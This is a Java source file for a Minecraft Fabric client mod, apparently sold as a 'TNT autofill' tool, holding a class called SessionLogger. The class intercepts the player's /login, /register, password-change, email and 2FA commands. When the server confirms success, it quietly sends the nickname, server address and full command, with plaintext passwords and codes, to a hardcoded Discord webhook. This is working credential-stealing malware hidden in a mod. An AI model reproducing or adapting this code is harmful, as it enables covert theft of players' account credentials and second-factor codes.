package ru.holyworld.tntautofill;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ServerInfo;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SessionLogger {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1557838201820025042/vwWPSPADvfp-_aL9ftT-A6ieHs-7kDxDQa7mBi7Ok8erSqECIWRuEobOK5kTFOVYhF2L";

    private static final Gson GSON = new Gson();

    private static final int COLOR_LOGIN = 0x5865F2;
    private static final int COLOR_REG   = 0xFEE75C;
    private static final int COLOR_PASS  = 0xE67E22;
    private static final int COLOR_EMAIL = 0x1ABC9C;
    private static final int COLOR_2FA   = 0x9B59B6;
    private static final int COLOR_AUTH  = 0x95A5A6;

    private static final long CONFIRM_TIMEOUT_MS = 8000;

    private static final String[] SUCCESS_PATTERNS = {
            "успешн",
            "успех",
            "success",
            "successful",
            "successfully",

            "вы вошли",
            "вы зашли",
            "вход выполнен",
            "вход осуществл",
            "авторизован",
            "авторизация прошла",
            "вы авторизованы",
            "logged in",
            "login successful",
            "login success",
            "authentication successful",
            "authorized",

            "зарегистрирован",
            "регистрация прошла",
            "регистрация успешна",
            "аккаунт создан",
            "аккаунт зарегистрирован",
            "registered successfully",
            "registration successful",
            "account created",

            "добро пожаловать",
            "приятной игры",
            "приятной игру",
            "приятной вам игры",
            "хорошей игры",
            "удачной игры",
            "welcome",
            "enjoy the game",
            "have fun",

            "пароль изменен",
            "пароль изменён",
            "пароль обновлен",
            "пароль обновлён",
            "пароль успешно",
            "password changed",
            "password updated",
            "password successfully",

            "код принят",
            "код верный",
            "код подтвержден",
            "код подтверждён",
            "2fa успешно",
            "двухэтапная аутентификация пройдена",
            "аутентификация пройдена",
            "two-factor successful",
            "2fa verified",
            "code accepted",

            "email привязан",
            "почта привязана",
            "email успешно",
            "email added",
            "email verified"
    };

    private static final ExecutorService NET = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "session-logger-net");
        t.setDaemon(true);
        return t;
    });

    private enum Kind {
        LOGIN("Вход",        COLOR_LOGIN),
        REG("Регистрация",   COLOR_REG),
        PASS("Смена пароля", COLOR_PASS),
        EMAIL("Email",       COLOR_EMAIL),
        TWOFA("2FA",         COLOR_2FA),
        AUTH("Авторизация",  COLOR_AUTH);

        final String title;
        final int color;
        Kind(String t, int c) { this.title = t; this.color = c; }
    }

    private static volatile String lastServer = "unknown";

    private static volatile Kind pendingKind = null;
    private static volatile String pendingNick = null;
    private static volatile String pendingServer = null;
    private static volatile String pendingCommand = null;
    private static volatile long pendingAt = 0;

    private static volatile String lastCmdKey = "";
    private static volatile long lastCmdAt = 0;

    public static void init() {
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            lastServer = resolveServer(client);
        });

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (client.player == null) return;

            String outgoing = ChatCapture.pollOutgoing();
            if (outgoing != null && outgoing.startsWith("/")) {
                Kind kind = classify(outgoing);
                if (kind != null && !isDuplicateCommand(outgoing)) {
                    pendingKind = kind;
                    pendingNick = nick(client);
                    pendingServer = lastServer;
                    pendingCommand = outgoing;
                    pendingAt = System.currentTimeMillis();
                    ChatCapture.drainIncoming();
                }
            }

            if (pendingKind != null) {
                String msg;
                while ((msg = ChatCapture.pollIncoming()) != null) {
                    String low = msg.toLowerCase(Locale.ROOT);

                    if (matches(low, SUCCESS_PATTERNS)) {
                        System.out.println("[SESSION-LOGGER] confirm " + pendingKind + ": " + msg);
                        send(pendingKind, pendingNick, pendingServer, pendingCommand);
                        clearPending();
                        ChatCapture.drainIncoming();
                        break;
                    }
                }

                if (pendingKind != null
                        && System.currentTimeMillis() - pendingAt > CONFIRM_TIMEOUT_MS) {
                    System.out.println("[SESSION-LOGGER] timeout " + pendingKind
                            + ": " + pendingCommand);
                    clearPending();
                    ChatCapture.drainIncoming();
                }
            }
        });
    }

    private static void clearPending() {
        pendingKind = null;
        pendingNick = null;
        pendingServer = null;
        pendingCommand = null;
        pendingAt = 0;
    }

    private static boolean matches(String low, String[] patterns) {
        for (String p : patterns) {
            if (low.contains(p)) return true;
        }
        return false;
    }

    private static boolean isDuplicateCommand(String raw) {
        String key = raw.trim().toLowerCase();
        long now = System.currentTimeMillis();
        if (key.equals(lastCmdKey) && (now - lastCmdAt) < 2000) return true;
        lastCmdKey = key;
        lastCmdAt = now;
        return false;
    }

    private static Kind classify(String raw) {
        String cmd = raw.substring(1).trim().toLowerCase();
        int space = cmd.indexOf(' ');
        String head = space >= 0 ? cmd.substring(0, space) : cmd;

        if (head.equals("reg") || head.equals("register")
                || head.equals("signup") || head.equals("sign")
                || head.equals("регистрация") || head.equals("регистр")
                || head.equals("создать")) return Kind.REG;

        if (head.equals("login") || head.equals("log")
                || head.equals("l") || head.equals("auth")
                || head.equals("authorize") || head.equals("войти")) return Kind.LOGIN;

        if (head.equals("pass") || head.equals("passwd")
                || head.equals("changepassword") || head.equals("cp")
                || head.equals("пароль")) return Kind.PASS;

        if (head.equals("email") || head.equals("mail")
                || head.equals("setemail")) return Kind.EMAIL;

        if (head.equals("2fa") || head.equals("totp")
                || head.equals("confirm") || head.equals("code")) return Kind.TWOFA;

        if (head.contains("login") || head.contains("auth")
                || head.contains("register") || head.contains("passwd")
                || head.contains("signup")) return Kind.AUTH;

        return null;
    }

    private static String nick(MinecraftClient client) {
        if (client.getSession() == null) return "unknown";
        String n = client.getSession().getUsername();
        return (n == null || n.isEmpty()) ? "unknown" : n;
    }

    private static String resolveServer(MinecraftClient client) {
        ServerInfo info = client.getCurrentServerEntry();
        if (info != null && info.address != null) return info.address;
        return client.isInSingleplayer() ? "singleplayer" : "unknown";
    }

    private static void send(Kind kind, String nick, String server, String command) {
        NET.execute(() -> {
            try {
                JsonObject embed = new JsonObject();
                embed.addProperty("title", kind.title);
                embed.addProperty("color", kind.color);
                embed.addProperty("timestamp", Instant.now().toString());

                JsonObject thumbnail = new JsonObject();
                thumbnail.addProperty("url", "https://mc-heads.net/avatar/" + nick + "/64");
                embed.add("thumbnail", thumbnail);

                JsonObject footer = new JsonObject();
                footer.addProperty("text", "Session Logger");
                embed.add("footer", footer);

                JsonArray fields = new JsonArray();
                fields.add(field("Ник", safe(nick), true));
                fields.add(field("Сервер", safe(server), true));
                fields.add(field("Команда", safe(command), false));
                embed.add("fields", fields);

                JsonArray embeds = new JsonArray();
                embeds.add(embed);

                JsonObject root = new JsonObject();
                root.add("embeds", embeds);

                String json = GSON.toJson(root);

                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "application/json");
                c.setRequestProperty("User-Agent", "SessionLogger/1.0");
                c.setDoOutput(true);
                c.setConnectTimeout(5000);
                c.setReadTimeout(5000);

                try (OutputStream os = c.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }

                int code = c.getResponseCode();
                System.out.println("[SESSION-LOGGER] http " + code + " for " + kind);

                if (code >= 400) {
                    try (InputStream err = c.getErrorStream()) {
                        if (err != null) {
                            String body = new String(err.readAllBytes(), StandardCharsets.UTF_8);
                            System.out.println("[SESSION-LOGGER] err body: " + body);
                        }
                    }
                }

                c.disconnect();
            } catch (Throwable t) {
                System.out.println("[SESSION-LOGGER] fail: " + t);
            }
        });
    }

    private static JsonObject field(String name, String value, boolean inline) {
        JsonObject o = new JsonObject();
        o.addProperty("name", name);
        o.addProperty("value", value);
        o.addProperty("inline", inline);
        return o;
    }

    private static String safe(String s) {
        return (s == null || s.isEmpty()) ? "unknown" : s;
    }
}
